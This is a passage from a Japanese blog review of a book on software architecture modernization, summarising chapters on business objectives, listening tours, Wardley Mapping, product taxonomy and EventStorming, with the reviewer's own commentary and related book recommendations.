持続的な改善を確立することに焦点を当てます。リーダーの仮面――「いちプレーヤー」から「マネジャー」に頭を切り替える思考法作者:安藤 広大ダイヤモンド社Amazonまとめ第2章は 現代化の旅を成功に導くための準備と課題を包括的に論じています。リーダーシップの準備、新しいアーキテクチャ思考の導入、銀の弾丸への警告 そして多層的なリーダーシップの重要性という4つの主要な側面から 具体的なガイダンスを提供しています。特に印象的なのは ICEの事例を通じて これらの原則が実践でどのように機能するかを示している点です。現代化は技術的な変革を超えた組織全体の取り組みであり その成功には包括的な準備と持続的な支援が不可欠であることを 説得力を持って論じています。3 Business objectives第3章「Business objectives」は アーキテクチャ現代化の投資判断とビジネス成果の関係性について包括的に論じています。本章を通じて著者は 設計の選択がビジネスの競争優位性と成長戦略にどのように影響するかを 具体的な事例とともに示しています。この章で議論されている「アーキテクチャ現代化の投資判断とビジネス成果の関係性」は、日本のIT業界ではあまり明示的に語られてこなかった文脈です。日本では技術的負債の解消や保守性の向上といった技術的な観点からの議論が中心で、ビジネスの競争優位性や成長戦略との結びつけは比較的最近になって注目され始めた領域と言えます。日本だとこの本を思い出した。みずほ銀行システム統合、苦闘の19年史　史上最大のITプロジェクト「3度目の正直」作者:日経コンピュータ,山端 宏実,岡部 一詩,中田 敦,大和田 尚孝,谷島 宣之日経BPAmazonビジネス観点からの現代化の必要性著者は現代化投資の判断基準として7つのビジネスシナリオを提示しています。市場におけるスピード競争の激化への対応や ビジネス成長の阻害要因の解消 出口戦略の実現など 経営視点に立った明確な指標が示されています。特に印象的なのは より速く動く競合他社への対応に関する指摘です。成功体験による慣性が イノベーションへの意欲を低下させる一方で 新規参入者は最新技術とアプローチを活用し 大胆なリスクテイクが可能です。この非対称性が大企業にとって脅威となることを著者は警告しています。戦略の要諦 (日本経済新聞出版)作者:リチャード・Ｐ・ルメルト日経BPAmazon金融サービス企業の事例では この課題が具体的に示されています。市場リーダーだった同社は セキュリティと安定性を重視するあまり リスクを回避する文化が定着していました。しかし 新興企業の参入により 優れたユーザー体験を持つサービスが登場し 市場シェアを脅かされる事態となりました。最終的に同社は新CTOを迎え 現代化への投資を決断しましたが その過程では多くの組織的な課題に直面しています。著者は 一度成功した企業が陥りやすい罠も指摘しています。成功体験による慣性は イノベーションへのモチベーションを低下させ 結果として技術的負債の蓄積を加速させます。これは 技術的負債の負のスパイラルと呼ぶべき状況を生み出します。一方で OpenTableの事例は この課題に対する前向きな取り組みを示しています。同社は競合の脅威を早期に認識し 全面的な現代化投資を実行することで 開発生産性の大幅な向上を実現しました。www.opentable.comUXと内部プロセスの現代化著者は 現代化の必要性がユーザー体験にも直結することを指摘しています。特に重要なのは 信頼性の欠如がブランドに与えるダメージです。レンタカー予約システムの事例では 技術的な問題が原因で同じ予約が3回重複して行われ 顧客の信頼を大きく損なう結果となりました。内部システムの非効率性も深刻な課題です。従業員が複数のレガシーシステムを使い分けざるを得ない状況は 業務効率の低下だけでなく 従業員の満足度にも悪影響を及ぼします。さらに 新規採用した従業員の教育コストも増大し 組織の成長を阻害する要因となります。成長戦略と現代化の関係性著者はマトリクスを用いて 4つの成長戦略と現代化の関係性を整理しています。既存市場での新製品開発では 共有機能の抽出とシステム統合が重要な課題となります。欧州の海洋機器メーカーの事例は この課題を端的に示しています。同社はIoTプラットフォームの開発を目指しましたが レガシーシステムの制約により 目標とする処理性能を達成できない事態に陥りました。既存製品での市場浸透では システムの最適化と運用コスト削減が焦点となります。ラテンアメリカのチャレンジャーバンクの事例は この視点からの現代化を示しています。同社は優れたUXにより市場での地位を確立しましたが 事業の拡大に伴いカスタマーサポートのコストが線形に増加する課題に直面しました。現代化は この課題を解決するための戦略的な投資として位置づけられています。戦略的指標としてのノーススター著者は戦略目標を表す指標として ノーススターメトリクス(NSM)の活用を提案しています。NSMは顧客への本質的な価値を表現し 組織の戦略と整合する数値目標です。これは単なる技術指標ではなく ビジネス成果と直結した指標である必要があります。Figure 3.2 Amplitude’s north star framework より引用Figure 3.2は Amplitudeのノーススターフレームワークを示しています。このフレームワークは インプットメトリクスからノーススターメトリクスを経て ビジネス成果に至る価値の流れを可視化します。これにより 現代化の取り組みと事業価値の関係を明確にすることが可能となります。DanseBank社の事例では このフレームワークを活用して PSD2対応の本質的な価値を「取引履歴に基づく迅速な与信判断」と定義しています。同社はエンジニアを含む横断的なチームで エンパシーマップを活用した顧客理解を進め 規制対応という表面的な目標を超えて 顧客価値の創造という本質的な目標を見出すことに成功しています。M&Aと現代化の課題現代化の文脈で特に重要なのが M&Aへの対応です。Salesforceの事例は この課題を端的に示しています。同社はSlackやGitHubなど 複数の大規模な買収を実行していますが それぞれの企業が異なる技術スタックとインフラを持つため システム統合に大きな課題を抱えています。このような状況では ドメイン境界の再定義が重要な課題となります。単なるシステム統合を超えて 製品やドメインの本質的な再定義が必要となるケースも少なくありません。これは技術的な課題であると同時に 組織的な挑戦でもあります。出口戦略としての現代化著者は 出口戦略を目指す企業における現代化の特殊性も指摘しています。IPOや買収を目指す企業では 2-3年という限られた時間軸での投資判断が求められます。この場合 長期的な技術的負債の解消よりも 短期的な価値の創出が優先される傾向があります。しかし著者は このアプローチにも一定の合理性があることを認めています。投資の時間軸を明確にすることで 優先順位の設定が容易になり より効果的な現代化が可能になる場合もあります。重要なのは 短期的な価値創出と長期的な技術的健全性のバランスを適切に取ることです。まとめ本章は 現代化への投資判断をビジネスの文脈で捉え 具体的な評価基準と実践方法を提示しています。特に ノーススターメトリクスの活用は 技術的な取り組みとビジネス成果を結びつける効果的な手法として注目に値します。また各種事例は 現代化が組織全体の変革として成功するための具体的なアプローチを示しています。著者の主張の本質は アーキテクチャ現代化を単なる技術刷新ではなく 組織の戦略的な変革として捉える点にあります。その成功には ビジネス戦略との整合性 投資判断の明確な基準 そして組織全体での価値共有が不可欠です。特に重要なのは 現場のエンジニアが顧客価値を深く理解し その実現に向けて主体的に取り組める環境の構築です。DanseBank社のエンパシーマップの活用は この理想的な姿を具体的に示しています。読者は 本章を通じて アーキテクチャ現代化を戦略的な投資として位置づけ その判断基準と実践方法を学ぶことができます。特に 技術的な観点とビジネス的な観点を結びつける具体的な手法は 実務での活用価値が高いと考えられます。今日のソフトウェア開発組織において アーキテクチャ現代化は避けて通れない課題となっています。本章は その取り組みを成功に導くための実践的なガイドラインを提供しているといえるでしょう。4 Listening and mapping tours第4章「Listening and mapping tours」は アーキテクチャ現代化の始め方に焦点を当てています。著者は まず聞くこと（listening）から始めるという基本姿勢を強調し その実践的なアプローチを提示しています。この章を通じて 組織全体の状況を把握し 実行可能な現代化戦略を策定するための体系的な手法が示されています。この構成は、アーキテクチャ現代化が本質的に技術的な課題である以上に、人々の協力と理解を必要とする社会的な取り組みであることを示唆しています。技術的な解決策がいかに優れていても、それを実現する人々の協力が得られなければ、現代化の取り組みは成功しないという現実を反映しています。「変化を嫌う人」を動かす:魅力的な提案が受け入れられない4つの理由作者:ロレン・ノードグレン,デイヴィッド・ションタル,船木 謙一(監修)草思社Amazonリスニングツアーの本質と準備著者は アーキテクチャ現代化の開始時に陥りがちな罠を指摘しています。多くの組織では 事前に用意した解決策を提案し その説得に注力しがちです。しかし このアプローチは組織の実態を十分に理解しないまま 表面的な解決策に走るリスクがあります。著者は この罠を回避するために リスニングツアーという手法を提案しています。リスニングツアーは 経営層から現場の開発者まで幅広い関係者と対話を行い 組織の課題と可能性を深く理解するプロセスです。特に重要なのは 単なるヒアリングではなく 関係者との信頼関係を構築し 組織の本質的な課題を浮き彫りにする点です。リスニングツアーの実施主体として 著者は AMET（Architecture Modernization Enabling Team）の設置を推奨しています。AMETは 技術とビジネスの両方を理解するメンバーで構成され 現代化のビジョン策定から実行支援までを担います。特に重要なのは チーム内で得られた知見を共有し 一貫した理解を構築する能力です。効果的なリスニングの実践リスニングツアーの成功には いくつかの重要な要素があります。最も基本的なのは 安全な対話の場の創出です。著者は 威圧的な空間ではなく 自由な対話が可能な環境づくりの重要性を説いています。これは カジュアルな場所の選択や 適切なタイミングの設定など 細かな配慮の積み重ねによって実現されます。同様に重要なのが 質問のデザインです。著者は 直接的な質問だけでなく より深い洞察を引き出すための多様な質問形式を提案しています。例えば「Complete the sentence（文章の完成）」では「私の仕事で現在最も腹が立つことは_____です」といった形式で 感情的な側面も含めた本音を引き出すことができます。問いの編集力 思考の「はじまり」を探究する作者:安藤昭子ディスカヴァー・トゥエンティワンAmazonまた「Choose an emotion（感情の選択）」では 感情のホイールから特定のトピックに対する感情を選ぶことで より深い理解を促進します。「Pick an image（画像の選択）」では 視覚的な表現を通じて 言葉では表現しにくい認識や感覚を共有することが可能になります。ツールボックスの活用効果的なリスニングツアーには 適切なツールの活用も重要です。著者は Impact Mappingを用いてビジネス目標とその実現手段の関係を可視化することを提案しています。これにより 戦略的な優先順位付けと 具体的な施策の選定が容易になります。Figure 4.4 A C4 container diagram with multiple risks identified より引用Risk Stormingは システムのリスクを特定し評価するための効果的なツールです。C4モデルをベースに システムの構造とリスクの関係を可視化することで 技術的な課題とビジネスインパクトの関連をより明確に理解できます。各リスクは 発生確率とインパクトの観点から評価され 優先度付けが行われます。グループワークショップと組織的な展開個別の対話に加えて 著者は グループワークショップの重要性も強調しています。臨床腫瘍学分野の非営利組織の事例では 参加者が自身のモダナイゼーションジャーニーを選択できるようなワークショップを設計しています。この中で ダブルダイヤモンドやデザインスクィグルといったモデルが活用され 参加者の主体的な関与を促進しています。特に興味深いのは ワークショップの段階的なアプローチです。最初にジャーニーのメタファーを選択し 次にドメインの境界を探索し 最後に具体的なアクションを計画するという流れは 参加者の理解と合意を段階的に構築する効果があります。キックスターターワークショップの実践現代化の実行フェーズへの移行には 3日間のキックスターターワークショップが効果的です。スカンジナビアの大規模企業の事例では このワークショップを通じて モノリシックなシステムからの段階的な移行戦略を策定しています。ワークショップの成功には 事前の準備が重要です。第1日目は ビジネスビジョンの共有と現状の分析に充てられ 第2日目は ドメインの探索とEventStormingによるプロセスの理解 第3日目は具体的なアーキテクチャ設計と実行計画の策定に焦点を当てます。この段階的なアプローチにより 参加者全員が共通の理解を持ちながら 具体的な行動計画を策定することが可能になります。ドメイン駆動設計をはじめよう ―ソフトウェアの実装と事業戦略を結びつける実践技法作者:Vlad KhononovオライリージャパンAmazon継続的な改善と展開著者は ワークショップの成果を継続的な改善につなげる重要性も強調しています。キックスターターワークショップで得られた勢いを維持するために AMETが重要な役割を果たします。AMETは 単なる技術支援チームではなく 組織の現代化能力を継続的に向上させるためのファシリテーターとして機能します。また 定期的なフィードバックと振り返りの機会を設けることで 現代化の取り組みを継続的に改善することが重要です。これには アンケートやフォローアップセッションの活用が効果的です。著者は これらのフィードバックを通じて 組織全体の学習と進化を促進することを推奨しています。まとめ本章は アーキテクチャ現代化の開始フェーズにおける実践的なアプローチを提示しています。特に重要なのは 聞くことから始めるという基本姿勢です。これは 単なるヒアリングを超えて 組織の本質的な課題と可能性を理解するための戦略的なアプローチです。著者が提案する手法は 理論的な枠組みと実践的なツールの巧みな組み合わせによって特徴づけられます。リスニングツアー グループワークショップ キックスターターワークショップという段階的なアプローチは 組織の現状を深く理解し 実行可能な現代化戦略を策定する上で効果的なフレームワークを提供しています。これらの手法の成功には 適切な環境作りと継続的なサポート体制が不可欠です。AMETの設置はその一つの解決策ですが より本質的には 組織全体が現代化の重要性を理解し その実現に向けて協力する体制を構築することが求められます。アーキテクトとして この組織的な側面への理解と対応が 現代化の成功に不可欠な要素といえるでしょう。5 Wardley Mapping第5章「Wardley Mapping」は ビジネス戦略とアーキテクチャ戦略を結びつけるための実践的なフレームワークとして Wardley Mappingを紹介しています。この章を通じて 著者はビジネスランドスケープの可視化と進化の理解が アーキテクチャ現代化の意思決定において重要な役割を果たすことを示しています。learnwardleymapping.com日本だと「Wardley Mapping」はあまり聞き馴染みのない言葉だと思います。実践例みたいなのもあまり聞いたことがありませんでした。blog-smatsuzaki.hatenablog.comengineer.crowdworks.jp戦略的思考とWardley MappingWardley Mappingは 単なる可視化ツールを超えて ビジネスとテクノロジーの戦略的統合を実現する手法です。この手法の特徴は バリューチェーンと進化という2つの軸で ビジネスランドスケープを表現する点にあります。これは従来の2x2マトリックスのような静的なフレームワークとは一線を画します。著者は 戦略サイクルという概念を用いて その実践プロセスを説明しています。このサイクルは 目的 ランドスケープ 気候 ドクトリン リーダーシップの5つのフェーズで構成されます。Figure 5.1は このサイクルの相互関係を示しています。特に重要なのは このサイクルが単なる一方向のプロセスではなく 継続的な学習と適応のループとして機能する点です。Figure 5.1 The Strategy Cycle (Source: Simon Wardley) より引用ただし 戦略サイクルは単なるプロセスモデルではありません。このフレームワークは 組織がどのように戦略を実践し 学習し 適応していくかという包括的な視点を提供します。例えば 目的の定義では 単なるミッションステートメントの作成を超えて 組織の存在意義と未来への展望を深く掘り下げることが求められます。マッピングの実践Wardley Mapの作成プロセスは 6つのステップで構成されます。まず目的を定義し スコープを設定し ユーザーを特定します。次にユーザーニーズを明確にし バリューチェーンを構築し 最後に各コンポーネントの進化段階を評価します。Ben MosiorのWardley Mapping Canvasは この一連のステップをガイドする効果的なツールです。特に重要なのは スコープの設定です。マッピングの範囲を適切に定義することで 意味のある議論と洞察が可能になります。スコープが広すぎると表面的な分析に終わり 狭すぎると重要な関係性を見落とす可能性があります。著者は この判断をサポートするための具体的な指針を提供しています。実際のマッピングでは オンラインフードデリバリー企業の例を用いて具体的な適用方法が示されています。このケースでは レストランと顧客をつなぐマルチサイドプラットフォームのビジネスモデルに焦点を当てています。段階的なマッピングプロセスを視覚的に示しています。この事例で特に注目すべきは バリューチェーンの構築プロセスです。コンポーネント間の依存関係を可視化することで 技術的な選択がビジネス価値にどのように影響するかが明確になります。例えば クラウドプラットフォームのような基盤的なコンポーネントが いかに上位のサービスの可能性を規定するかが理解できます。進化の理解と評価Wardley Mappingにおける進化の概念は 単なる技術的な成熟度を超えた意味を持ちます。Genesis Custom Built Product Commodityという4つのステージは それぞれ異なる特性と戦略的意味を持ちます。著者は この評価を支援するための15の基準を提示しています。例えば Ubiquity（普及度）とCertainty（確実性）は 進化段階を評価する重要な特性です。さらに 市場の成熟度やユーザーの認識など 12の一般的な特性も評価の基準として提示されています。これらの基準を用いた評価は 必ずしも一意的な結果をもたらすわけではありません。むしろ 異なる視点からの評価結果の違いが 重要な戦略的議論のきっかけとなります。著者は この曖昧性を否定的に捉えるのではなく 組織の学習機会として活用することを推奨しています。気候変動の理解と対応著者は 競争環境の変化を「気候」として捉え その重要性を強調しています。特に すべては進化するという原則は 戦略策定の基本的な前提となります。この原則は 単なる観察結果ではなく 戦略的な対応を要求する動的な状況を示しています。特に重要なのは コンポーネントの共進化という概念です。技術やビジネスモデルは単独で進化するのではなく 相互に影響を与えながら進化します。例えば リモートワークの普及は Zoom SlackなどのコラボレーションツールとWi-Fi接続性の進化が組み合わさることで可能になりました。戦略的対応のパターン著者は 環境変化への対応として アクセラレーターとデセラレーターという2つのパターンを提示しています。アクセラレーターには オープンソース化やネットワーク効果の活用が含まれます。一方 デセラレーターには 知的財産権の保護やFUDの活用があります。特に注目すべきは オープンアプローチの戦略的活用です。著者は GoogleやMicrosoftの事例を引用し オープンソース化が競争優位性の獲得につながる可能性を示しています。例えば TensorFlowのオープンソース化は 機械学習の分野でGoogleの影響力を強化することに貢献しました。組織的な実践への示唆Wardley Mappingの実践では 技術的な側面だけでなく 組織的な側面も重要です。特に チーム間のコラボレーションと共通言語としてのマッピングが重要な役割を果たします。著者は AMETなどの組織的な枠組みの活用も提案しています。この手法の導入には 段階的なアプローチが有効です。著者は まずキーとなるステークホルダーとの小規模なマッピングセッションから始め 徐々に範囲を拡大していくことを推奨しています。これにより 組織全体での理解と受容が促進されます。まとめWardley Mappingは アーキテクチャ現代化の文脈で 特に重要な3つの価値を提供します。第一に ビジネスとテクノロジーの統合的な理解を促進します。第二に 進化という視点を通じて 長期的な戦略立案を支援します。第三に 具体的な意思決定のフレームワークを提供します。本章で示された手法は 特にアーキテクチャの意思決定において実践的な価値があります。技術選択やシステム構造の決定を ビジネス戦略との整合性を保ちながら行うことが可能になります。さらに 継続的な環境変化に対応する能力も強化されます。アーキテクトとして この手法を活用する際は 単なる技術マッピングに終始せず ビジネス価値との結びつきを常に意識することが重要です。また 組織全体での共通言語としてWardley Mappingを活用することで より効果的な戦略的対話が可能になるでしょう。最後に 著者は この手法の習得には継続的な実践が不可欠であることを強調しています。理論的な理解だけでなく 実際のビジネス課題への適用を通じて その効果的な活用方法を学んでいく必要があります。特に 気候変動の理解と戦略的対応のパターンは 実践を通じて深い理解が得られる領域といえるでしょう。6 Product taxonomy第6章「Product taxonomy」は アーキテクチャ現代化の基盤となる製品分類の枠組みを提示しています。タクソノミー（taxonomy）とは もともと生物学で用いられる分類体系のことで 生物をその特徴によって分類し 体系化する方法を指します。この考え方をソフトウェア開発組織に適用したのが プロダクトタクソノミーです。著者は この枠組みを通じて 組織構造とアーキテクチャの整合性を実現するための具体的なアプローチを示しています。プロダクトマネジメントのすべて 事業戦略・IT開発・UXデザイン・マーケティングからチーム・組織運営まで作者:及川 卓也,小城 久美子,曽根原 春樹翔泳社Amazonタクソノミーの意義と基本概念プロダクトタクソノミーは 組織のアーキテクチャを製品視点で体系化するためのフレームワークです。従来の組織構造やシステム構成が必ずしも効率的な開発を実現できていない現状に対して タクソノミーという視点で再構築することで より効果的な組織とアーキテクチャの形を見出すことができます。特に重要なのは タクソノミーがただの分類ではなく 価値提供の単位を定義する点です。これは 単なる技術的な構造化ではなく ビジネス価値の創出を中心に据えた組織設計を可能にします。実際の適用では 既存の組織構造や技術的な制約との調整が必要になりますが タクソノミーという視点があることで より戦略的な判断が可能になります。独立した価値ストリームプロダクトタクソノミーの核となるのが 独立した価値ストリームという概念です。著者は Figure 6.1と6.2を用いて この概念を説明しています。価値ストリームは ユーザーニーズの特定から解決策の提供まで 一連の開発活動を表します。Figure 6.1 The high-level activities in an independent value stream より引用Figure 6.2 The four key characteristics of an independent value stream より引用価値ストリームの独立性を実現するには 4つの重要な特性が必要です。1つ目は ビジネスサブドメインとの整合性です。これは 特定のビジネス領域に焦点を当てることで 明確な価値提供を可能にします。2つ目は 明確なビジネス成果への焦点です。具体的な成果指標を持つことで チームの方向性が明確になります。3つ目は 自律的なチームによる所有権です。チームが自律的に意思決定できることで 開発のスピードと質が向上します。4つ目は デカップルされたソフトウェアアーキテクチャです。技術的な独立性が チームの自律性を支えます。スコープとドメインの階層構造著者は Ruth MalanとDana Bredemeyerのアーキテクチャスコープレベルを参照しながら 組織の階層構造に応じた3つのスコープレベルを定義しています。スコープ1は 単一のチームが所有する小規模なドメイン スコープ2は 複数のチームが必要な中規模なドメイン スコープ3は さらに大きな組織的な複雑さを持つドメインを表します。この階層構造は 組織の規模や複雑さに応じた適切な分類を可能にします。例えば 小規模な組織では スコープ1と2で十分かもしれません。一方で Salesforceのような大規模組織では より多くのスコープレベルが必要になることもあります。ドメインとプロダクトの関係性ドメインは 関連するサブドメインをグループ化したものです。Figure 6.3の例では fulfillmentドメインが availability last mile warehousing logisticsという4つのサブドメインで構成されています。各サブドメインは独立した価値ストリームを持ち それぞれが特定の業務機能に焦点を当てています。プロダクトは より広い概念として定義されています。著者は Melissa Perriの定義を引用し プロダクトを「市場に提供可能な 繰り返し可能なソリューションで 特定のニーズや要求を満たすもの」と定義しています。この定義の重要な点は プロダクトが単なる機能の集合ではなく 顧客への完全な価値提供を実現する単位だという点です。プラットフォームの戦略的活用プラットフォームは 複数のプロダクトで共有される機能を提供する重要な要素です。著者は ドメインプラットフォームと内部開発プラットフォームの2種類を定義しています。Figure 6.6は これらの関係性を視覚的に示しています。Figure 6.6 Platforms provide reuse across multiple products より引用ドメインプラットフォームは ビジネスドメインに関連する共有機能を提供します。例えば 予約システムや認証システムなどが該当します。一方 内部開発プラットフォームは チームの開発活動を支援する機能を提供します。CI/CDパイプラインやモニタリングツールなどがこれにあたります。NAVの事例は プラットフォーム戦略の実践を示す良い例です。ノルウェーの行政機関であるNAVは 内部開発プラットフォームを複数のサブプラットフォームに分解することで スケーラビリティの課題に対応しています。特に重要なのは プラットフォームをプロダクトとして扱う「Platform as a Product」というアプローチです。これにより 利用者であるチームのニーズに適切に対応できる体制を維持しています。タクソノミーの設計と進化プロダクトタクソノミーの設計には、いくつかの重要な原則があります。これらの原則は、組織の現状を踏まえながら、段階的に理想的な状態へと進化させていくためのガイドラインとなります。第一の原則：容易な部分からの段階的アプローチまず重要なのは、容易な部分から始めることです。既存の製品ラインナップを整理・分類することから着手し、現在の組織構造を出発点として活用します。特に、チームが理解しやすい領域から取り組みを開始し、小さな成功を積み重ねて徐々に範囲を拡大していくことが効果的です。このアプローチにより、組織全体の理解と受容を促進しながら、段階的な改善を進めることができます。第二の原則：適切な技術・手法の活用効果的なタクソノミー設計には、状況に応じた適切な手法の選択が重要です。EventStormingはドメインの理解と境界の特定に、Wardley Mappingは価値連鎖と進化の段階の可視化に効果的です。さらにドメインストーリーテリングは具体的なユースケースの理解を深め、インパクトマッピングはビジネス目標との整合性を確認するのに役立ちます。これらの手法を組み合わせることで、表面的な理解を超えた深い洞察を得ることができます。第三の原則：継続的な進化の実践タクソノミーは静的なものではなく、継続的に進化させる必要があります。現状のアーキテクチャと目標とする価値ストリームの差異を定期的に評価し、四半期ごとのタクソノミー見直しと更新を実施することが求められます。ビジネス環境の変化や新たな要件への適応も重要な要素です。特に重要なのは、不整合の特定から始まり、段階的な改善を経て、定期的な評価とフィードバックの収集までの一連のプロセスです。現状と目標のギャップを明確にし、優先順位付けされた課題に取り組み、進捗を確認しながら方向性を調整していきます。このような継続的な改善サイクルを通じて、組織の成長と技術の進化に適応したタクソノミーを維持することができます。実践のためのガイドライン効果的な実践のためには、定期的なレビューセッションの開催が重要です。ステークホルダーからのフィードバックを収集し、成功事例と課題を文書化します。さらに、学習した内容を組織全体で共有することで、タクソノミーを組織の実態に即した、実用的なツールとして育てていくことができます。このような体系的なアプローチにより、タクソノミーは単なる分類システムを超えて、組織の変革と成長を支える重要な基盤となります。継続的な改善と適応を通じて、組織全体の効果的な進化を支援する枠組みとして機能していくのです。ソフトウェアアーキテクトのための意思決定術　リーダーシップ／技術／プロダクトマネジメントの活用作者:Srinath Perera,島田 浩二インプレスAmazonマクロレベルの戦略的課題マクロレベルでの重要な課題として 再利用の戦略があります。Figure 6.12は この課題を視覚的に表現しています。特に グローバル企業において 各地域市場で機能を複製するか 中央集権的なプラットフォームを構築するかという選択は 重要な戦略的決定となります。この選択には いくつかの重要な考慮点があります。ユーザー体験の一貫性 優先順位付けの方法 資金モデル 依存関係の管理 効率性と市場投入速度のバランスなどです。これらの要素を総合的に評価し 組織に適した戦略を選択する必要があります。Stripeの事例は この課題への実践的なアプローチを示しています。同社は Treasury機能の開発において 最初は独立した実装を行い 市場での検証後に既存のインフラストラクチャへの統合を進めました。このアプローチは 短期的な市場投入速度と長期的な効率性のバランスを取る良い例といえます。プロダクトモードへの移行従来のプロジェクトモードが スコープ コスト 期間の制約のもとで一時的なチームが成果を出すのに対し プロダクトモードは 長期的な継続的改善にフォーカスし 安定したチームによる自律的な開発を重視します。この移行は 単なる開発プロセスの変更ではありません。資金モデル チームの責任範囲 成功の定義など 組織全体の文化とマインドセットの変革が必要です。著者は この変革が一夜にして達成されるものではないと指摘しつつ その実現がアーキテクチャ現代化の成功には不可欠だと主張しています。まとめプロダクトタクソノミーは アーキテクチャ現代化を実現するための戦略的なフレームワークです。その核となる価値ストリームの独立性と プラットフォームの適切な活用は 組織の効率性と革新性を両立させる鍵となります。特に重要なのは タクソノミーが静的な分類ではなく 継続的に進化する生きた構造だという点です。定期的な見直しと更新を通じて 組織の成長と技術の進化に対応していく必要があります。アーキテクトとして この章から学ぶべき重要な点は タクソノミーが単なる構造の定義ではなく チームの自律性と技術的な進化を支える枠組みだということです。その設計と進化を適切にガイドすることが 現代化の成功に不可欠な要素といえるでしょう。組織の規模や状況に応じて 適切なアプローチを選択し 段階的な実現を目指すことが 実践的な戦略となります。7 Big picture EventStorming第7章「Big picture EventStorming」は、アーキテクチャ現代化において最も重要な「ゆっくり考える」フェーズを実現するための手法を紹介しています。著者は性急な意思決定の危険性を指摘し、その解決策としてEventStormingというコラボレーティブな技法を提示しています。現代化プロジェクトの多くは、「すばやく考え、ゆっくり動く」というパターンに陥りがちです。予算、工期、便益の3点全てを満たすプロジェクトは例外中の例外（0.5%）であり、その主な原因は初期の理解と計画が不十分なままプロジェクトを開始してしまうことにあります。BIG THINGS　どデカいことを成し遂げたヤツらはなにをしたのか？作者:ベント・フリウビヤ,ダン・ガードナーサンマーク出版AmazonEventStormingは、この課題に対する具体的な解決策を提供します。ドメインの深い理解を得るために十分な時間を確保し、関係者全員で慎重に検討を重ねることで、後続のフェーズで迅速な実行を可能にします。これは「ゆっくり考え、すばやく動く」という成功プロジェクトに共通する特徴を体現しています。本章では、この手法の実践的な適用方法と、組織全体での価値創造について、体系的な説明を展開していきます。特に重要なのは、人の心理や組織の力学が初期の理解フェーズを軽視させがちだという点への対処です。EventStormingは、この人間的な側面も考慮に入れた、実践的で効果的なアプローチを提供します。EventStormingの本質EventStormingは 2010年代半ばにAlberto Brandoliniによって考案された ドメイン探索のための手法です。その最大の特徴は シンプルな表記法と高い包摂性にあります。ドメインイベントという概念を用いて 業務の流れを左から右への時系列で表現します。Figure 7.1は その基本的な構造を示しています。Figure 7.1 Using domain events to map out a business on a timeline from left to right より引用特に重要なのは この手法が特別なトレーニングを必要としない点です。製品開発に関わる全ての人々（開発者 テスター プロダクトマネージャー UXデザイナー カスタマーサポート担当者など）が 自然に参加できるよう設計されています。これは 組織内の知識を最大限に活用し より深いドメイン理解を得るために不可欠な特性といえます。私自身の経験でも EventStormingの価値を実感する場面は多くあります。例えば あるプロジェクトで開発者が「この機能は重要ではない」と考えていた問題について カスタマーサポート担当者から「今朝も2件の問い合わせがあった」という指摘があり 認識のズレが明らかになった事例があります。このような気づきは 個別のインタビューでは得られにくいものです。手法の実践EventStormingの実践には いくつかの重要な要素があります。まず 会場の準備です。8メートル以上の壁面スペースと 付箋やペンなどの文具が必要です。Figure 7.8が最高なのでぜひ書籍を読んでみて下さい。また、テーブルや椅子は最小限にし 参加者が自由に動き回れる環境を整えることが重要です。セッションの進め方も重要です。著者は カオス的な探索という概念を提唱しています。これは 最初から整然とした構造を求めるのではなく 参加者全員が思いつくままにドメインイベントを書き出していく方法です。Figure 7.2は この過程を視覚的に示しています。Figure 7.2 An EventStorm runs from left to right but does not need to be neatly and precisely laid out. より引用私の実践では この「カオス」の許容が非常に重要だと感じています。整然とした構造を早期に求めすぎると 重要な気づきが失われる可能性があります。特に レガシーシステムの現代化では 表面には現れていない依存関係や制約が多く存在するため この探索的なアプローチが効果的です。ファシリテーションの技術EventStormingのファシリテーションには 高度なスキルが要求されます。著者は Figure 7.17など用いて いくつかの重要な原則を示しています。特に重要なのは 抽象度のバランスです。過度に抽象的なイベントは 重要な詳細を隠してしまい 過度に具体的なイベントは 全体像の理解を妨げます。Figure 7.17 Overly abstract events より引用実践的なテクニックとして ピボットイベントの活用があります。これは タイムライン全体を適切なサイズに分割し 理解を促進するための手法です。Figure 7.11は この手法の適用例を示しています。このような構造化により 複雑なドメインでも理解しやすくなります。Figure 7.11 Using pivotal events to sort the timeline より引用私の経験では このピボットイベントの選定が セッションの成否を分ける重要な要素となることが多いです。適切なピボットイベントは ドメインの本質的な変化点を表現し より深い議論のきっかけを提供します。問題とチャンスの発見著者は EventStormingが 単なるプロセスの可視化ではなく 問題とチャンスの発見ツールとしても機能することを強調しています。Figure 7.15は ユーザーのドロップアウトポイントを示す例です。このような視覚化により 業務上の課題がより明確になります。Figure 7.15 A customer dropping out of the funnel, resulting in lost revenue より引用特に興味深いのは 知識の欠落や争点の発見です。著者は 2017年の金融アドバイス業界での事例を紹介しています。この事例では メトリクスの計算方法について 開発者とマーケティング責任者の間で認識の不一致が発見されました。このような発見は 組織の意思決定の質を向上させる重要な機会となります。リモートでの実践パンデミック以降 リモートでのEventStormingの実践が急速に広がっています。著者は この変化を単なる代替手段としてではなく 新たな可能性として捉えています。Miroなどのデジタルツールでは 物理的な制約なく無限のモデリングスペースを使用でき コピー＆ペーストなどの効率的な操作も可能です。私の実践でも リモートならではの利点を多く発見しています。例えば 複数のセッションを時間をかけて実施できることや グループワークでの素早い複製と比較が可能なことは 大きな価値です。ただし 参加者の集中力維持や 非言語コミュニケーションの制限には 十分な注意が必要です。まとめEventStormingは アーキテクチャ現代化において 不可欠なツールです。その価値は 単なるプロセスの可視化を超えて 組織の知識の統合と 深い洞察の獲得にあります。特に 現代のソフトウェア開発において重要な ドメイン駆動設計の実践を支援する強力なツールとなります。一方で この手法の効果的な活用には 適切なファシリテーションスキルと 組織文化の醸成が必要です。Discovery mindsetの確立や bikesheddingの回避など 実践上の課題にも注意を払う必要があります。アーキテクトとして この手法を活用する際は 単なるテクニックとしてではなく 組織の知識を統合し 現代化の方向性を見出すための戦略的なツールとして位置づけることが重要です。特に レガシーシステムの現代化において その価値は極めて高いといえるでしょう。8 Product and domain modernization第8章「Product and domain modernization」は、アーキテクチャ現代化における製品とドメインの重要性に焦点を当てています。この章を通じて、著者は現代化が単なる技術的な刷新を超えて、ユーザー体験、製品価値、ドメインモデルの根本的な見直しを必要とすることを示しています。DDD（Domain-Driven Design）という言葉をよく耳にしますが、「DDDって結局クリーンアーキテクチャのことですか？」といった質問を受けることも多く、その本質的な理解が十分に広まっているとは言えない状況です。本章は、DDDの核心である「ドメインモデリング」について体系だった説明を提供しており、その点だけでも大きな価値があります。特に、ドメインモデルが単なる技術的な設計パターンではなく、ビジネスの本質を理解し表現するための手法であることが、具体的な事例とともにわかりやすく解説されています。ドメイン駆動設計入門 